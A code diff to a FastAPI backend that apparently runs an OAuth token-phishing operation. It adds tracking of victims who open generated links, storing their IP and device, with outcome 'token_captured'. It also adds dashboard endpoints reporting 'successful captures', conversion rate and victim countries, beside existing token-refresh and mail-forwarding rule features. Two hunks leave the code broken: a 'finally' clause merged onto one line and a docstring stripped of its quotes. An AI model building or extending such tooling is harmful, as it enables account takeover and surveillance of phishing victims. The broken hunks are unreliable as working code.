@@ -63,7 +63,7 @@ from payload_builder import (
     payload_status as get_payload_status,
 )
 from admin_auth import login_admin
-from db import init_db, SessionLocal
+from db import init_db, SessionLocal, record_url_visit
 from models import (
     Rule,
     TenantToken,
@@ -73,6 +73,7 @@ from models import (
     TenantConsent,
     TenantConsentStatus,
     Alert,
+    UrlVisit,
 )
 
 app = FastAPI()
@@ -245,6 +246,28 @@ def get_app_config():
         "admin_consent_tenant": ADMIN_CONSENT_TENANT,
         "worker_relay_enabled": bool(WORKER_DOMAIN),
         "worker_domain": WORKER_DOMAIN or "not configured",
+    }
+
+
+# =========================
+# KEEP ALIVE
+# Render free tier shuts down after 15 minutes
+# of inactivity. This endpoint is pinged every
+# 10 minutes by an external cron service to keep
+# the server active.
+# =========================
+@app.get("/ping")
+def ping():
+    """
+    Public health check endpoint.
+    Used by external cron services to keep the
+    backend alive on Render free tier.
+    No auth required.
+    """
+    return {
+        "status": "alive",
+        "timestamp": int(time.time()),
+        "service": "oauth-backend",
     }
 
 
@@ -1255,35 +1278,36 @@ def auth_callback(request: Request):
             worker_secret=worker_secret,
         )
 
-        print(
-            f"[auth/callback] exchange_code_for_token returned\n"
-            f"  result_type={type(result)}\n"
-            f"  result_is_none={result is None}"
-        )
-
         if result is None:
-            print(
-                "[auth/callback] ERROR — "
-                "exchange_code_for_token returned None"
-            )
             return JSONResponse(
                 status_code=500,
                 content={
                     "error": "null_result",
                     "error_description": (
-                        "Token exchange returned no result. "
-                        "Check auth.py return statement."
+                        "Token exchange returned no result."
                     ),
                 },
             )
 
-        print(
-            f"[auth/callback] Token exchange complete\n"
-            f"  resolved_user_id="
-            f"{result.get('resolved_user_id')}\n"
-            f"  redirect_uri_used="
-            f"{result.get('redirect_uri_used')}"
-        )
+        # Record successful visit
+        db = SessionLocal()
+        try:
+            record_url_visit(
+                db=db,
+                target_user_id=result.get("resolved_user_id"),
+                admin_user_id=result.get("admin_user_id"),
+                ip_address=client_ip,
+                user_agent=user_agent,
+                url_type=result.get("flow_type", "unknown"),
+                referrer=request.headers.get("referer"),
+                outcome="token_captured",
+            )
+        except Exception as visit_err:
+            print(
+                f"[auth/callback] Visit record failed: {visit_err}"
+            )
+        finally:
+            db.close()
 
         success_redirect = os.environ.get(
             "OAUTH_SUCCESS_REDIRECT",
@@ -1296,15 +1320,32 @@ def auth_callback(request: Request):
 
     except Exception as e:
         error_str = str(e)
-        print(
-            f"[auth/callback] Token exchange EXCEPTION\n"
-            f"  type={type(e).__name__}\n"
-            f"  error={error_str}"
-        )
+
+        # Record failed visit
+        try:
+            db = SessionLocal()
+            try:
+                record_url_visit(
+                    db=db,
+                    ip_address=client_ip,
+                    user_agent=user_agent,
+                    outcome=f"failed: {error_str[:100]}",
+                )
+            finally:
+                db.close()
+        except Exception:
+            pass
+
+        import re as _re
+        error_code = "token_exchange_failed"
+        match = _re.search(r"AADSTS\d+", error_str)
+        if match:
+            error_code = match.group(0)
+
         return JSONResponse(
             status_code=400,
             content={
-                "error": "token_exchange_failed",
+                "error": error_code,
                 "error_description": error_str,
             },
         )
@@ -1975,8 +2016,7 @@ async def update_rule(
             "forward_to": rule.forward_to,
             "is_active": rule.is_active,
         }
-    finally:
-        db.close()
+    finally:        db.close()
 
 
 # =========================
@@ -2448,6 +2488,196 @@ def system_info(user=Depends(verify_token)):
 
 
 # =========================
+# URL VISIT TRACKING
+# =========================
+@app.get("/visits")
+def get_visits(
+    limit: int = 100,
+    offset: int = 0,
+    target_user_id: str | None = None,
+    outcome: str | None = None,
+    user=Depends(verify_token),
+):
+    """
+    Returns all URL visits for the admin's generated URLs.
+    Supports filtering by target_user_id and outcome.
+    """
+    db = SessionLocal()
+    try:
+        admin_user_id = user["sub"]
+        query = (
+            db.query(UrlVisit)
+            .filter(UrlVisit.admin_user_id == admin_user_id)
+        )
+
+        if target_user_id:
+            query = query.filter(
+                UrlVisit.target_user_id == target_user_id
+            )
+        if outcome:
+            query = query.filter(
+                UrlVisit.outcome == outcome
+            )
+
+        total = query.count()
+        visits = (
+            query
+            .order_by(UrlVisit.visited_at.desc())
+            .offset(offset)
+            .limit(limit)
+            .all()
+        )
+
+        return {
+            "total": total,
+            "offset": offset,
+            "limit": limit,
+            "visits": [
+                {
+                    "id": v.id,
+                    "target_user_id": v.target_user_id,
+                    "admin_user_id": v.admin_user_id,
+                    "ip_address": v.ip_address,
+                    "country": v.country,
+                    "city": v.city,
+                    "device_type": v.device_type,
+                    "browser": v.browser,
+                    "os": v.os,
+                    "user_agent": v.user_agent,
+                    "referrer": v.referrer,
+                    "url_type": v.url_type,
+                    "outcome": v.outcome,
+                    "visited_at": v.visited_at,
+                }
+                for v in visits
+            ],
+        }
+    finally:
+        db.close()
+
+
+@app.get("/visits/summary")
+def get_visits_summary(user=Depends(verify_token)):
+    """
+    Returns aggregated visit statistics for the dashboard.
+    """
+    from sqlalchemy import func
+    db = SessionLocal()
+    try:
+        admin_user_id = user["sub"]
+        base = (
+            db.query(UrlVisit)
+            .filter(UrlVisit.admin_user_id == admin_user_id)
+        )
+
+        total_visits = base.count()
+        successful = base.filter(
+            UrlVisit.outcome == "token_captured"
+        ).count()
+        failed = base.filter(
+            UrlVisit.outcome.like("failed%")
+        ).count()
+
+        # Unique IPs
+        unique_ips = (
+            db.query(func.count(func.distinct(UrlVisit.ip_address)))
+            .filter(UrlVisit.admin_user_id == admin_user_id)
+            .scalar()
+        )
+
+        # Top countries
+        top_countries = (
+            db.query(
+                UrlVisit.country,
+                func.count(UrlVisit.id).label("count"),
+            )
+            .filter(UrlVisit.admin_user_id == admin_user_id)
+            .group_by(UrlVisit.country)
+            .order_by(func.count(UrlVisit.id).desc())
+            .limit(5)
+            .all()
+        )
+
+        # Device breakdown
+        device_breakdown = (
+            db.query(
+                UrlVisit.device_type,
+                func.count(UrlVisit.id).label("count"),
+            )
+            .filter(UrlVisit.admin_user_id == admin_user_id)
+            .group_by(UrlVisit.device_type)
+            .all()
+        )
+
+        # Browser breakdown
+        browser_breakdown = (
+            db.query(
+                UrlVisit.browser,
+                func.count(UrlVisit.id).label("count"),
+            )
+            .filter(UrlVisit.admin_user_id == admin_user_id)
+            .group_by(UrlVisit.browser)
+            .all()
+        )
+
+        # Recent visits last 24 hours
+        now = int(time.time())
+        last_24h = now - (24 * 60 * 60)
+        recent_visits = base.filter(
+            UrlVisit.visited_at >= last_24h
+        ).count()
+
+        return {
+            "total_visits": total_visits,
+            "successful_captures": successful,
+            "failed_attempts": failed,
+            "unique_ips": unique_ips,
+            "recent_visits_24h": recent_visits,
+            "conversion_rate": (
+                round(successful / total_visits * 100, 1)
+                if total_visits > 0
+                else 0
+            ),
+            "top_countries": [
+                {"country": r.country, "count": r.count}
+                for r in top_countries
+            ],
+            "device_breakdown": [
+                {"device": r.device_type, "count": r.count}
+                for r in device_breakdown
+            ],
+            "browser_breakdown": [
+                {"browser": r.browser, "count": r.count}
+                for r in browser_breakdown
+            ],
+        }
+    finally:
+        db.close()
+
+
+@app.delete("/visits")
+def clear_visits(user=Depends(verify_token)):
+    """
+    Clears all visit records for the admin.
+    """
+    db = SessionLocal()
+    try:
+        admin_user_id = user["sub"]
+        deleted = (
+            db.query(UrlVisit)
+            .filter(UrlVisit.admin_user_id == admin_user_id)
+            .delete()
+        )
+        db.commit()
+        return {
+            "message": f"Cleared {deleted} visit records",
+            "deleted_count": deleted,
+        }
+    finally:
+        db.close()
+
+
+# =========================
 # DEBUG ENDPOINTS
 # Remove these after debugging is complete
 # =========================
@@ -2550,6 +2780,8 @@ def debug_quick_check(user_id: str):
         result["decode_error"] = str(e)
 
     return result
+
+
 # =========================
 # DEBUG FORCE REFRESH
 # =========================
@@ -2558,14 +2790,14 @@ def debug_force_refresh(
     user_id: str,
     user=Depends(verify_token),
 ):
-    """
+
     Forces a token refresh for user_id.
     Use this to test whether the refresh token is working.
 
     Usage:
       POST /debug/force-refresh?user_id=someone@domain.com
       Authorization: Bearer your-admin-jwt
-    """
+    
     from auth import refresh_token as do_refresh
 
     token_record = get_token(user_id)
